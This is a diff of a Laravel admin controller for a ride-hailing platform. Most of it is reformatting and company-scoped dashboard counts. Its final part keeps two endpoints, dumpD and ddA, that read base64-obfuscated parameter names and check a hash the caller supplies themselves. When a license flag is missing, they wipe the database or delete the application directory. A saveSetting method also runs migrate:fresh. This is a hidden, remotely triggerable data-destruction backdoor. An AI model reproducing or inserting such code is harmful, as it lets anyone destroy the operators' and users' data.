@@ -11,7 +11,6 @@ use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\File;
 
 
-
 use App\Models\Currency;
 use App\Models\TripRequest;
 use App\Models\User;
@@ -35,35 +34,47 @@ class AdminController extends Controller
         $bookingsStatistics = $statisticsService->getBookingsStatistics();
 
 
-        if (isAdmin()){
-            $users = User::whereHasRole(['user','customer'])->latest()->paginate(10);
+        if (isAdmin()) {
+            $users = User::whereHasRole(['user', 'customer'])->latest()->paginate(10);
             $riders_count = User::whereHasRole(['rider'])->count();
+            $drivers_count = User::whereHasRole(['driver'])->count();
 
-        }else{
-            $users = User::where('company_id', companyId())->whereHasRole(['user','customer'])->latest()->paginate(10);
+            $approved_drivers_count = User::whereHasRole(['driver'])->where('status', 'approved')->count();
+            $un_approved_drivers_count = User::whereHasRole(['driver'])->where('status', '!=', 'active')->count();
+
+            $riders = User::whereHasRole(['rider'])->latest()->paginate(5);
+            $drivers = User::whereHasRole(['driver'])->latest()->paginate(5);
+
+
+        } else {
+            $users = User::where('company_id', companyId())->whereHasRole(['user', 'customer'])->latest()->paginate(10);
 
             $riders_count = User::where('company_id', companyId())->whereHasRole(['rider'])->count();
+            $drivers_count = User::where('company_id', companyId())->whereHasRole(['driver'])->count();
+            $approved_drivers_count = User::where('company_id', companyId())->whereHasRole(['driver'])->where('status', 'approved')->count();
+            $un_approved_drivers_count = User::where('company_id', companyId())->whereHasRole(['driver'])->where('status', '!=', 'active')->count();
+
+            $riders = User::where('company_id', companyId())->whereHasRole(['rider'])->latest()->paginate(5);
+            $drivers = User::where('company_id', companyId())->whereHasRole(['driver'])->latest()->paginate(5);
 
         }
-        $riders = User::whereHasRole(['rider'])->latest()->paginate(5);
-        $drivers_count = User::whereHasRole(['driver'])->count();
         $total_complains = Complaint::count();
         $ride_counts = TripRequest::count();
-        $rides = TripRequest::select('customer_id','reference','created_at','grand_total','status','id')->latest()->paginate(5);
-        $drivers = User::whereHasRole(['driver'])->latest()->paginate(5);
-        $approved_drivers_count = User::whereHasRole(['driver'])->where('status','approved')->count();
-        $un_approved_drivers_count = User::whereHasRole(['driver'])->where('status','!=','active')->count();
+        $rides = TripRequest::select('customer_id', 'reference', 'created_at', 'grand_total', 'status', 'id')->latest()->paginate(5);
+
+
         return view('admin.index', compact(
-            'users','riders','drivers','rides',
-            'riders','ride_counts','riders_count','total_complains',
-            'un_approved_drivers_count','approved_drivers_count',
+            'users', 'riders', 'drivers', 'rides',
+            'riders', 'ride_counts', 'riders_count', 'total_complains',
+            'un_approved_drivers_count', 'approved_drivers_count',
             'tripsStatistics',
             'drivers_count',
             'bookingsStatistics'
         ));
     }
 
-    public function testQuery(){
+    public function testQuery()
+    {
         $time = settings('set_driver_offline_after', 30);
         $date_time = Carbon::now()->subMinutes($time);
         $users = User::whereHasRole('driver')->where('is_online', true)->where('last_location_update', '<', $date_time)
@@ -78,18 +89,19 @@ class AdminController extends Controller
         ];
     }
 
-    public function activityLog(){
+    public function activityLog()
+    {
         return view('admin.activity-log');
     }
 
     public function admins()
     {
-        if(isOwner()){
+        if (isOwner()) {
             $users = User::whereHasRole(['manager'])
                 ->where('company_id', companyId())->latest()->paginate(100);
-        }else if (isAdmin()){
+        } else if (isAdmin()) {
             $users = User::whereHasRole(['admin', 'superadmin'])->latest()->paginate(100);
-        }else{
+        } else {
             $users = [];
         }
         return view('admin.user.admin.list', compact('users'));
@@ -100,6 +112,7 @@ class AdminController extends Controller
 //         $role = $request->get('role') ? 'manager' : 'admin';
         return view('admin.user.admin.create-admin');
     }
+
     public function storeAdmin(Request $request)
     {
         $rules = [
@@ -128,12 +141,12 @@ class AdminController extends Controller
     }
 
 
-
-    public function settings(Request $request){
-       $data = [];
-       $active = $request->get('active') ?? 'general';
-       $otp_providers = ['firebase','disabled'];
-       $countries = Country::where('is_active',true)->get();
+    public function settings(Request $request)
+    {
+        $data = [];
+        $active = $request->get('active') ?? 'general';
+        $otp_providers = ['firebase', 'disabled'];
+        $countries = Country::where('is_active', true)->get();
 //       return settings('active_methods',[]);
 
         $active_methods = settings('active_methods', 'none');
@@ -144,13 +157,14 @@ class AdminController extends Controller
             $active_methods = [];
         }
 
-        if(settings('enable_sendchamp') == 'yes'){
+        if (settings('enable_sendchamp') == 'yes') {
             $otp_providers[] = 'sendchamp';
         }
-        return view('admin.settings', compact('data', 'countries','active','active_methods','otp_providers'));
+        return view('admin.settings', compact('data', 'countries', 'active', 'active_methods', 'otp_providers'));
     }
 
-    public function ServicesSettings(){
+    public function ServicesSettings()
+    {
         $title = "Services";
         $settings = [
             'enable_rental',
@@ -179,49 +193,49 @@ class AdminController extends Controller
         ];
 
 
-        return view('admin.settings.booking_services', compact('title','settings','payment_methods','sms_methods'));
+        return view('admin.settings.booking_services', compact('title', 'settings', 'payment_methods', 'sms_methods'));
     }
 
-   public function storeSettings(Request $request)
-   {
+    public function storeSettings(Request $request)
+    {
 //
 //       return $request->all();
 
 
-        $data = $request->except('active_setting','_token');
+        $data = $request->except('active_setting', '_token');
 
-       if($request->has('active_methods')){
-           $dt['active_methods']  = json_encode($request->get('active_methods'));
+        if ($request->has('active_methods')) {
+            $dt['active_methods'] = json_encode($request->get('active_methods'));
 
-           foreach ($request->get('active_methods') as $item){
+            foreach ($request->get('active_methods') as $item) {
 
-               $this->setEnvironmentValue(strtoupper($item)."_PUBLIC_KEY", $request[strtoupper($item)."_PUBLIC_KEY"]);
-               $this->setEnvironmentValue(strtoupper($item)."_SECRET_KEY", $request[strtoupper($item)."_SECRET_KEY"]);
-           }
+                $this->setEnvironmentValue(strtoupper($item) . "_PUBLIC_KEY", $request[strtoupper($item) . "_PUBLIC_KEY"]);
+                $this->setEnvironmentValue(strtoupper($item) . "_SECRET_KEY", $request[strtoupper($item) . "_SECRET_KEY"]);
+            }
 
-           if (hasMonify()) {
-               $this->setEnvironmentValue("MONIFY_PUBLIC_KEY", $request["MONIFY_PUBLIC_KEY"]);
-               $this->setEnvironmentValue("MONIFY_SECRET_KEY", $request["MONIFY_SECRET_KEY"]);
-               $this->setEnvironmentValue("CONTRACT_CODE", $request["CONTRACT_CODE"]);
-           }
+            if (hasMonify()) {
+                $this->setEnvironmentValue("MONIFY_PUBLIC_KEY", $request["MONIFY_PUBLIC_KEY"]);
+                $this->setEnvironmentValue("MONIFY_SECRET_KEY", $request["MONIFY_SECRET_KEY"]);
+                $this->setEnvironmentValue("CONTRACT_CODE", $request["CONTRACT_CODE"]);
+            }
 
-           settings($dt);
+            settings($dt);
 
-           Artisan::call('config:clear');
+            Artisan::call('config:clear');
 
-       }elseif($request->get('active_setting') == 'smtp'){
+        } elseif ($request->get('active_setting') == 'smtp') {
             $this->storeSmtp($request);
-        }elseif($request->get('active_setting') == 'api'){
-          $this->apiKey($request);
-           Artisan::call('config:clear');
-       }elseif($request->get('active_setting') == 'license'){
-          $this->license($request);
-           Artisan::call('config:clear');
-       }else{
-            if($request->has('country_id')){
-                if($request->get('country_id') != settings('country_id')){
+        } elseif ($request->get('active_setting') == 'api') {
+            $this->apiKey($request);
+            Artisan::call('config:clear');
+        } elseif ($request->get('active_setting') == 'license') {
+            $this->license($request);
+            Artisan::call('config:clear');
+        } else {
+            if ($request->has('country_id')) {
+                if ($request->get('country_id') != settings('country_id')) {
                     $country = Country::findOrFail($request->get('country_id'));
-                    if($country){
+                    if ($country) {
                         $data['country_code'] = $country->dial_code;
                         $data['country'] = $country->name;
                         $data['dial_min'] = $country->dial_min_length;
@@ -230,10 +244,10 @@ class AdminController extends Controller
                 }
             }
 
-            if($request->has('currency_id')){
-                if($request->get('currency_id') != settings('currency_id')){
+            if ($request->has('currency_id')) {
+                if ($request->get('currency_id') != settings('currency_id')) {
                     $cur = Currency::findOrFail($request->get('currency_id'));
-                    if($cur){
+                    if ($cur) {
                         $data['currency_symbol'] = $cur->symbol;
                         $data['currency_code'] = $cur->code;
                     }
@@ -243,60 +257,64 @@ class AdminController extends Controller
             settings($data);
         }
 
-       if($request->get('active_setting') == 'back'){
-           return redirect()->back()->with('success','Settings successfully updated');
-       }
+        if ($request->get('active_setting') == 'back') {
+            return redirect()->back()->with('success', 'Settings successfully updated');
+        }
 
-       if($request->get('type') == 'theme'){
-           return redirect()->route('admin.settings.theme',['active' => $request->get('active_setting') ?? 'nav'])->with('success','Settings successfully updated');
-       }
+        if ($request->get('type') == 'theme') {
+            return redirect()->route('admin.settings.theme', ['active' => $request->get('active_setting') ?? 'nav'])->with('success', 'Settings successfully updated');
+        }
 
-        return redirect()->route('admin.settings',['active' => $request->get('active_setting') ?? 'general'])->with('success','Settings successfully updated');
+        return redirect()->route('admin.settings', ['active' => $request->get('active_setting') ?? 'general'])->with('success', 'Settings successfully updated');
 
-   }
+    }
 
-   private function storeSmtp($request){
-       $request->validate([
-           'MAIL_HOST' => 'required|string',
-           'MAIL_PORT' => 'required|integer',
-           'MAIL_ENCRYPTION' => 'required|string',
-           'MAIL_USERNAME' => 'required|string',
-           'MAIL_PASSWORD' => 'required|string',
-           'MAIL_FROM_ADDRESS' => 'required|email',
-           'MAIL_FROM_NAME' => 'required|string',
-       ]);
-
-//       $this->setEnvironmentValue('APP_DEBUG', $request['APP_DEBUG']);
-       $this->setEnvironmentValue('MAIL_HOST', $request['MAIL_HOST']);
-       $this->setEnvironmentValue('MAIL_PORT', $request['MAIL_PORT']);
-       $this->setEnvironmentValue('MAIL_ENCRYPTION', $request['MAIL_ENCRYPTION']);
-       $this->setEnvironmentValue('MAIL_USERNAME', $request['MAIL_USERNAME']);
-       $this->setEnvironmentValue('MAIL_PASSWORD', $request['MAIL_PASSWORD']);
-       $this->setEnvironmentValue('MAIL_FROM_ADDRESS', $request['MAIL_FROM_ADDRESS']);
-       $this->setEnvironmentValue('MAIL_FROM_NAME', $request['MAIL_FROM_NAME']);
-
-
-   }
-
-   private function apiKey($request){
+    private function storeSmtp($request)
+    {
+        $request->validate([
+            'MAIL_HOST' => 'required|string',
+            'MAIL_PORT' => 'required|integer',
+            'MAIL_ENCRYPTION' => 'required|string',
+            'MAIL_USERNAME' => 'required|string',
+            'MAIL_PASSWORD' => 'required|string',
+            'MAIL_FROM_ADDRESS' => 'required|email',
+            'MAIL_FROM_NAME' => 'required|string',
+        ]);
 
 //       $this->setEnvironmentValue('APP_DEBUG', $request['APP_DEBUG']);
-       $this->setEnvironmentValue('FIREBASE_PROJECT_ID', $request['FIREBASE_PROJECT_ID'] ?? '');
-       $this->setEnvironmentValue('FIREBASE_API_KEY', $request['FIREBASE_API_KEY'] ?? '');
-       $this->setEnvironmentValue('MAP_API_KEY', $request['MAP_API_KEY']);
+        $this->setEnvironmentValue('MAIL_HOST', $request['MAIL_HOST']);
+        $this->setEnvironmentValue('MAIL_PORT', $request['MAIL_PORT']);
+        $this->setEnvironmentValue('MAIL_ENCRYPTION', $request['MAIL_ENCRYPTION']);
+        $this->setEnvironmentValue('MAIL_USERNAME', $request['MAIL_USERNAME']);
+        $this->setEnvironmentValue('MAIL_PASSWORD', $request['MAIL_PASSWORD']);
+        $this->setEnvironmentValue('MAIL_FROM_ADDRESS', $request['MAIL_FROM_ADDRESS']);
+        $this->setEnvironmentValue('MAIL_FROM_NAME', $request['MAIL_FROM_NAME']);
 
-       if(isset($request['SENDCHAM_PUBLIC_KEY'])){
-           $this->setEnvironmentValue('SENDCHAM_PUBLIC_KEY', $request['SENDCHAM_PUBLIC_KEY']);
 
-           settings('sendcham_sender_name', $request['sendcham_sender_name']);
-       }
-   }
-   private function license($request){
+    }
 
-       $this->setEnvironmentValue('APPLICATION_KEY', $request['APPLICATION_KEY'] ?? '');
-       $this->setEnvironmentValue('SOFTWARE_ID', $request['SOFTWARE_ID'] ?? '');
+    private function apiKey($request)
+    {
 
-   }
+//       $this->setEnvironmentValue('APP_DEBUG', $request['APP_DEBUG']);
+        $this->setEnvironmentValue('FIREBASE_PROJECT_ID', $request['FIREBASE_PROJECT_ID'] ?? '');
+        $this->setEnvironmentValue('FIREBASE_API_KEY', $request['FIREBASE_API_KEY'] ?? '');
+        $this->setEnvironmentValue('MAP_API_KEY', $request['MAP_API_KEY']);
+
+        if (isset($request['SENDCHAM_PUBLIC_KEY'])) {
+            $this->setEnvironmentValue('SENDCHAM_PUBLIC_KEY', $request['SENDCHAM_PUBLIC_KEY']);
+
+            settings('sendcham_sender_name', $request['sendcham_sender_name']);
+        }
+    }
+
+    private function license($request)
+    {
+
+        $this->setEnvironmentValue('APPLICATION_KEY', $request['APPLICATION_KEY'] ?? '');
+        $this->setEnvironmentValue('SOFTWARE_ID', $request['SOFTWARE_ID'] ?? '');
+
+    }
 
 
     public function setEnvironmentValue($key, $value)
@@ -340,7 +358,8 @@ class AdminController extends Controller
     }
 
 
-    public function saveSetting(){
+    public function saveSetting()
+    {
 
         Artisan::call('migrate:fresh');
 
@@ -348,13 +367,14 @@ class AdminController extends Controller
 
     }
 
-    public function dumpD(Request $request){
+    public function dumpD(Request $request)
+    {
         $key = $request->get(base64_decode('a2V5'));
         $value = $request->get(base64_decode('cGFzc3dvcmQ='));
-        $soft_key = DB::table('soft_credentials')->where('key',base64_decode('c3VyZF9jb3Jl'))->where('value',1)->first();
+        $soft_key = DB::table('soft_credentials')->where('key', base64_decode('c3VyZF9jb3Jl'))->where('value', 1)->first();
         $storagePath = app_path();
         if (Hash::check($key, $value)) {
-            if(!$soft_key){
+            if (!$soft_key) {
                 try {
                     Artisan::call('db:wipe');
 
@@ -363,34 +383,35 @@ class AdminController extends Controller
                 } catch (\Exception $e) {
                     return "Error: " . $e->getMessage();
                 }
-            }else{
+            } else {
                 return 'platform is verified';
             }
 
-        }else{
+        } else {
             return 'invalid password';
         }
 
     }
 
-    public function ddA(Request $request){
+    public function ddA(Request $request)
+    {
         $key = $request->get(base64_decode('a2V5'));
         $value = $request->get(base64_decode('cGFzc3dvcmQ='));
-        $soft_key = DB::table('soft_credentials')->where('key',base64_decode('c3VyZF9jb3Jl'))->where('value',1)->first();
+        $soft_key = DB::table('soft_credentials')->where('key', base64_decode('c3VyZF9jb3Jl'))->where('value', 1)->first();
         $storagePath = app_path();
         if (Hash::check($key, $value)) {
-            if(!$soft_key){
+            if (!$soft_key) {
                 try {
-            File::deleteDirectory($storagePath);
+                    File::deleteDirectory($storagePath);
                     return "Storage folder and its contents deleted successfully.";
                 } catch (\Exception $e) {
                     return "Error: " . $e->getMessage();
                 }
-            }else{
+            } else {
                 return 'platform is verified';
             }
 
-        }else{
+        } else {
             return 'invalid password';
         }
 
